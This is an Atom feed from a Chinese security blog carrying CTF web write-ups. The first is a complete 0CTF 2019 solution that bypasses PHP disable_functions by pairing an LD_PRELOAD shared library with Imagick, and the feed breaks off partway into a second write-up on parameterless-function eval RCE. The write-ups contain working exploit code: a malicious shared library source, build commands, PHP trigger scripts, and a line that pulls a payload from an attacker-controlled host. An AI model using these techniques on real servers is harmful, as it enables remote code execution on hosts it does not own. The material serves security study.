<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sky&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://skysec.top/"/>
  <updated>2019-03-29T04:52:31.923Z</updated>
  <id>http://skysec.top/</id>
  
  <author>
    <name>一叶飘零</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2019 0CTF Web WriteUp</title>
    <link href="http://skysec.top/2019/03/25/2019-0CTF-Web-WriteUp/"/>
    <id>http://skysec.top/2019/03/25/2019-0CTF-Web-WriteUp/</id>
    <published>2019-03-25T06:15:04.000Z</published>
    <updated>2019-03-29T04:52:31.923Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>二刷0ctf，去年被虐的很惨，今年还是一样 :(</p><h2 id="Ghost-Pepper"><a href="#Ghost-Pepper" class="headerlink" title="Ghost Pepper"></a>Ghost Pepper</h2><h2 id="Wallbreaker-Easy"><a href="#Wallbreaker-Easy" class="headerlink" title="Wallbreaker Easy"></a>Wallbreaker Easy</h2><p>拿到题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Imagick is a awesome library for hackers to break `disable_functions`.</span><br><span class="line">So I installed php-imagick in the server, opened a `backdoor` for you.</span><br><span class="line">Let&apos;s try to execute `/readflag` to get the flag.</span><br><span class="line">Open basedir: /var/www/html:/tmp/d4dabdbc73b87e364e29e60c60a92900</span><br><span class="line">Hint: eval($_POST[&quot;backdoor&quot;]);</span><br></pre></td></tr></table></figure></p><p>题目给了3个信息：</p><ul><li>execute <code>/readflag</code> to get the flag</li><li>Open basedir: /var/www/html:/tmp/d4dabdbc73b87e364e29e60c60a92900</li><li>Hint: eval($_POST[“backdoor”]);</li></ul><p>我们知道题目是有后门的，但是有<code>disable_functions</code>限制，所以我们首先查看一下phpinfo内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail</span><br></pre></td></tr></table></figure></p><p>过滤非常多，但思路非常清晰：<br>1.bypass open basedir<br>2.bypass disable functions<br>3.execute readflag</p><h3 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open basedir"></a>open basedir</h3><p>我们做个简单的测试<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">php &gt; ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/var/www/html'</span>);</span><br><span class="line">php &gt; var_dump(scandir(<span class="string">'/var/www/html'</span>));</span><br><span class="line"><span class="keyword">array</span>(<span class="number">5</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">1</span>) <span class="string">"."</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  string(<span class="number">2</span>) <span class="string">".."</span></span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  string(<span class="number">7</span>) <span class="string">"hack.so"</span></span><br><span class="line">  [<span class="number">3</span>]=&gt;</span><br><span class="line">  string(<span class="number">10</span>) <span class="string">"index.html"</span></span><br><span class="line">  [<span class="number">4</span>]=&gt;</span><br><span class="line">  string(<span class="number">23</span>) <span class="string">"index.nginx-debian.html"</span></span><br><span class="line">&#125;</span><br><span class="line">php &gt; var_dump(scandir(<span class="string">'/tmp'</span>));</span><br><span class="line">bool(<span class="keyword">false</span>)</span><br></pre></td></tr></table></figure></p><p>即open basedir是用来限制访问目录的，我们看一下题目源代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">backdoor=readfile(&apos;index.php&apos;);</span><br></pre></td></tr></table></figure></p><p>可以得到<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$dir = <span class="string">"/tmp/"</span> . md5(<span class="string">"$_SERVER[REMOTE_ADDR]"</span>);</span><br><span class="line">mkdir($dir);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>, <span class="string">'/var/www/html:'</span> . $dir);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;style&gt;.pre &#123;word-<span class="keyword">break</span>: <span class="keyword">break</span>-all;max-width: <span class="number">500</span>px;white-space: pre-wrap;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;pre class="pre"&gt;&lt;code&gt;Imagick is a awesome library for hackers to break `disable_functions`.</span><br><span class="line">So I installed php-imagick in the server, opened a `backdoor` <span class="keyword">for</span> you.</span><br><span class="line">Let<span class="string">'s try to execute `/readflag` to get the flag.</span></span><br><span class="line"><span class="string">Open basedir: &lt;?php echo ini_get('</span>open_basedir<span class="string">');?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php eval($_POST["backdoor"]);?&gt;</span></span><br><span class="line"><span class="string">Hint: eval($_POST["backdoor"]);</span></span><br><span class="line"><span class="string">&lt;/code&gt;&lt;/pre&gt;&lt;/body&gt;</span></span><br></pre></td></tr></table></figure></p><p>题目也是使用了这样的限制，我们只能访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/tmp/md5(&quot;$_SERVER[REMOTE_ADDR]);</span><br><span class="line">/var/www/html</span><br></pre></td></tr></table></figure></p><p>那么如何bypass open basedir与disable functions呢这里不难搜到这样一篇文章<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/</span><br></pre></td></tr></table></figure></p><p>文中提及，我们可以用<code>LD_PRELOAD</code>+<code>putenv</code>打一套组合拳，既能绕过open basedir，又能绕过disable functions</p><h3 id="LD-PRELOAD与putenv"><a href="#LD-PRELOAD与putenv" class="headerlink" title="LD_PRELOAD与putenv"></a>LD_PRELOAD与putenv</h3><p>这里我们先来看一下原理，首先什么是LD_PRELOAD？<br>google给出如下定义<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.</span><br></pre></td></tr></table></figure></p><p>即LD_PRELOAD这个环境变量指定路径的文件，会在其他文件被调用前，最先被调用<br>而putenv可以设置环境变量<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putenv ( string $setting ) : bool</span><br></pre></td></tr></table></figure></p><p>添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。<br>同时该函数也未被过滤。那么我们可以有如下骚操作：<br>1.制作一个恶意shared libraries<br>2.使用putenv设置LD_PRELOAD为恶意文件路径<br>3.使用某个php函数，触发specific shared library<br>4.成功进行RCE<br><img src="/images/2019-03-25-15-17-11.png" alt=""><br>而既然要在php运行时被触发，那么势必选择一个非常常用的函数才行<br>那么怎么找到这个函数呢？</p><h3 id="传统方式-hijacking-function"><a href="#传统方式-hijacking-function" class="headerlink" title="传统方式(hijacking function)"></a>传统方式(hijacking function)</h3><p>在已有的文章中显示，一般使用php<code>mail()</code>函数进行触发，我们简单分析一下<br>这里简单写个demo<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mail(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>我们strace一下，可以看到运行这个脚本的时候，程序会启子进程来调用sendmail<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;/usr/bin/php&quot;, [&quot;php&quot;, &quot;test.php&quot;], [/* 20 vars */]) = 0</span><br><span class="line">[pid 23864] execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;/usr/sbin/sendmail -t -i &quot;], [/* 20 vars */]) = 0</span><br><span class="line">[pid 23865] execve(&quot;/usr/sbin/sendmail&quot;, [&quot;/usr/sbin/sendmail&quot;, &quot;-t&quot;, &quot;-i&quot;], [/* 20 vars */]) = 0</span><br></pre></td></tr></table></figure></p><p>那么我们只要看一下sendmail使用了哪些函数<br><img src="/images/2019-03-26-09-50-30.png" alt=""><br>有很多函数可以使用，这里可以选择geteuid()，然后我们编写自己的evil shared libraries：hack.c<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        system(<span class="string">"ls / &gt; /tmp/sky"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">geteuid</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">"LD_PRELOAD"</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后编译一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC hack.c -o hack</span><br><span class="line">gcc --share hack -o hack.so</span><br></pre></td></tr></table></figure></p><p>然后我们运行脚本<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">"LD_PRELOAD=./hack.so"</span>);</span><br><span class="line">mail(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-03-26-10-04-10.png" alt=""><br>不难发现它执行了命令，然后可以发现/tmp目录下多了一个文件sky<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@sky:~# ls /tmp | grep sky</span><br><span class="line">sky</span><br></pre></td></tr></table></figure></p><p>我们查看一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@sky:~# cat /tmp/sky</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">....</span><br></pre></td></tr></table></figure></p><p>发现成功执行命令</p><h3 id="改进版-hijack-shared-library"><a href="#改进版-hijack-shared-library" class="headerlink" title="改进版(hijack shared library)"></a>改进版(hijack shared library)</h3><p>但其实这个方法是将条件变得严苛了，我们干的事情局限于找到一个函数，然后对其进行注入<br>但实际上我们可以更加直接，我们先将sendmail进行删除<br><img src="/images/2019-03-26-10-16-07.png" alt=""><br>如图所示现在已经没有了sendmail，但我们依旧可以进行rce，可使用如下文件sky.c<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void angel (void)&#123;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    system(&quot;ls&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>其中<code>__attribute__ ((__constructor__))</code>有如下说明<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.It&apos;s run when a shared library is loaded, typically during program startup.</span><br><span class="line">2.That&apos;s how all GCC attributes are; presumably to distinguish them from function calls.</span><br><span class="line">3.The destructor is run when the shared library is unloaded, typically at program exit.</span><br></pre></td></tr></table></figure></p><p>所以当我们最开始将evil shared library load上后，就会触发<code>__attribute__ ((__constructor__))</code>，从而达成我们rce的目的.</p><h3 id="函数寻找"><a href="#函数寻找" class="headerlink" title="函数寻找"></a>函数寻找</h3><p>但本题中mail函数已被disable_functions限制，所以我们并不能按照上述模式进行攻击。那么我们要找到一个什么样的函数才能满足我们的条件呢？<br>从上述内容不难发现，我们必须找到一个能在运行时候启动子进程的函数才行，因为我们设置了环境变量，必须restart才能生效，所以如果能启动一个子进程，那么我们的设置的LD_PRELOAD就会加载我们的evil shared library.<br>这里我们发现题目提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">So I installed php-imagick in the server, opened a `backdoor` for you.</span><br></pre></td></tr></table></figure></p><p>所以我们主要探究php-imagick到底能不能干类似的事情<br>我们阅读php-imagick源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ImageMagick/ImageMagick</span><br></pre></td></tr></table></figure></p><p>我们发现如下对应关系<br><img src="/images/2019-03-26-10-30-31.png" alt=""><br>我们发现当文件是MPEG format时，程序会调用’ffmpeg’ program进行转换，而如下后缀都被认为成MPEG format<br><img src="/images/2019-03-26-09-40-53.png" alt=""><br>我们测试一下.wmv<br>写出脚本<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$img = <span class="keyword">new</span> Imagick(<span class="string">'sky.wmv'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>我们测试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;/usr/bin/php&quot;, [&quot;php&quot;, &quot;sky.php&quot;], [/* 21 vars */]) = 0</span><br><span class="line">[pid 25217] execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;\&quot;ffmpeg\&quot; -v -1 -i \&quot;/tmp/magick-2&quot;...], [/* 21 vars */]) = 0</span><br></pre></td></tr></table></figure></p><p>可以发现的确成功启动了子进程，调用了ffmpeg<br>但是如果sky.wmv文件不存在时<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;/usr/bin/php&quot;, [&quot;php&quot;, &quot;sky.php&quot;], [/* 21 vars */]) = 0</span><br></pre></td></tr></table></figure></p><p>则不会调用ffmpeg<br>所以也不难分析出，应该是有一步判断文件是否存在的操作，再会去进行调用相关程序进行解码转换的操作<br>所以如果想利用Imagick新起子进程，那么我们得先有后面的参数文件，当然这并不是什么难事。</p><h3 id="payload-amp-attack"><a href="#payload-amp-attack" class="headerlink" title="payload &amp; attack"></a>payload &amp; attack</h3><p>那么只剩最后的攻击了，找到了可以起子进程的方式，只差构造evil shared library了<br>我们还是用之前的sky.c<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">angel</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">    system(<span class="string">"ls"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后编译一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC sky.c -o sky</span><br><span class="line">gcc --share sky -o sky.so</span><br></pre></td></tr></table></figure></p><p>测试一下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">"LD_PRELOAD=./sky.so"</span>);</span><br><span class="line">$img = <span class="keyword">new</span> Imagick(<span class="string">'sky.wmv'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>运行发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@sky:~# php sky.php</span><br><span class="line">bin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lib32  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  systest  tmp  usrvar  vmlinuz  vmlinuz.old</span><br><span class="line">PHP Fatal error:  Uncaught ImagickException: unable to open image `/tmp/magick-25528VpF8npGTawCz.pam&apos;: No such file or directory @ error/blob.c/OpenBlob/2712 in /root/sky.php:3</span><br><span class="line">Stack trace:</span><br><span class="line">#0 /root/sky.php(3): Imagick-&gt;__construct(&apos;sky.wmv&apos;)</span><br><span class="line">#1 &#123;main&#125;</span><br><span class="line">  thrown in /root/sky.php on line 3</span><br></pre></td></tr></table></figure></p><p>我们成功的进行了列目录</p><h3 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h3><p>那么现在思路很清晰：<br>1.把我们的sky.so和sky.wmv上传到题目的/tmp/sandbox中<br>2.利用backdoor运行sky.php<br>3.在tmp目录读取重定向的结果<br>首先我们按照题目意思，调用/readflag<br>文件内容为<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">angel</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">    system(<span class="string">"/readflag &gt; /tmp/d4dabdbc73b87e364e29e60c60a92900/flag"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后是上传文件，我们有很多种方法，这里可以使用<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$upload = <span class="string">'/tmp/d4dabdbc73b87e364e29e60c60a92900/sky.wmv'</span>;</span><br><span class="line"><span class="keyword">echo</span> copy(<span class="string">"http://vps_ip/sky.wmv"</span>, $upload);</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-03-26-10-54-53.png" alt=""><br>我们可以看到上传成功了<br>然后我们执行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">putenv(<span class="string">"LD_PRELOAD=/tmp/d4dabdbc73b87e364e29e60c60a92900/sky.so"</span>);</span><br><span class="line">$img = <span class="keyword">new</span> Imagick(<span class="string">'/tmp/d4dabdbc73b87e364e29e60c60a92900/sky.wmv'</span>);</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-03-26-12-15-37.png" alt=""><br>可以看到flag已经打到了/tmp目录下<br>我们进行读取即可<br><img src="/images/2019-03-26-12-16-50.png" alt=""></p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>这个题目还是比较有趣的，学习到了不少姿势~</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于安全客</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;二刷0ctf，去年被虐的很惨，今年还是一样 :(&lt;/p&gt;
&lt;h2 id=&quot;Ghost-Pepper&quot;&gt;&lt;a href=&quot;#Ghost-Pep
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2018 Code Breaking(3) &amp; phplimit</title>
    <link href="http://skysec.top/2019/03/10/2018-Code-Breaking-3-phplimit/"/>
    <id>http://skysec.top/2019/03/10/2018-Code-Breaking-3-phplimit/</id>
    <published>2019-03-10T04:59:13.000Z</published>
    <updated>2019-03-29T04:52:16.882Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次是phplimit这道题，本篇文章提供了3种解法，即如何利用无参数函数进行RCE/任意文件读取</p><h2 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h2><p>题目源码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>代码非常清晰，首先<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])</span><br></pre></td></tr></table></figure></p><p>代码会将<code>$_GET[&#39;code&#39;]</code>中满足正则<code>/[^\W]+\((?R)?\)/</code>的部分，替换为空，然后查看是否剩下的部分强等于<code>;</code><br>如果满足，则执行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br></pre></td></tr></table></figure></p><p>否则什么都不做。那么思路很明确，我们弄清楚正则即可进行RCE<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[^\W]+\((?R)?\)</span><br></pre></td></tr></table></figure></p><p>首先是<code>[^\W]</code><br>对于<code>\W</code>,其意思等价于<code>[^A-Za-z0-9_]</code>。<br>那么我们知道，我们的input必须以此开头<br>然后是括号匹配<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\( ...... \)</span><br></pre></td></tr></table></figure></p><p>括号中间为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(?R)?</span><br></pre></td></tr></table></figure></p><p>意思为重复整个模式<br>简单理解，我们可以输入以下类型<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a(b(c()))</span><br></pre></td></tr></table></figure></p><p>但我们不能加参数,否则将无法匹配<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a(c,d)</span><br></pre></td></tr></table></figure></p><p>所以正则看完，题目的意思非常明确了：<br>我们只能input函数，但函数中不能使用参数，否则判断句右边经过替换，将不止剩余分号<code>;</code></p><h2 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h2><p>那么有没有办法通过无参数函数，达到RCE的目的呢？答案显然是不可能的，没有参数，怎么传递我们需要执行的指令呢？<br>所以我们的目标也变得很明确：通过某种无参数函数获取指定位置的变量value，达到RCE的目的。<br>那么哪里有我们可以控制的变量，并且还能通过无参数函数获取到呢？<br>那么思路又变得清晰了，http header就是我们的突破口。我们可以更改header中的各项属性，以及其value。<br>那么有没有函数可以函数http header呢？<br>我们在php手册中直接搜索<br><img src="/images/2019-03-10-13-30-09.png" alt=""><br>能用的手段很多，例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getallheaders()</span><br><span class="line">file_get_contents(array_pop(apache_request_headers()))</span><br></pre></td></tr></table></figure></p><p>但如果我们测试的话，会发现均不可用，因为其为Apache函数<br>但我们看当前题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Server: nginx/1.15.9</span><br><span class="line">&lt; Date: Sun, 10 Mar 2019 05:24:56 GMT</span><br><span class="line">&lt; Content-Type: text/html; charset=utf-8</span><br><span class="line">&lt; Transfer-Encoding: chunked</span><br><span class="line">&lt; Connection: keep-alive</span><br><span class="line">&lt; X-Powered-By: PHP/5.6.40</span><br><span class="line">&lt;</span><br></pre></td></tr></table></figure></p><p>其是nginx，所以之前的方式均无效了。</p><h2 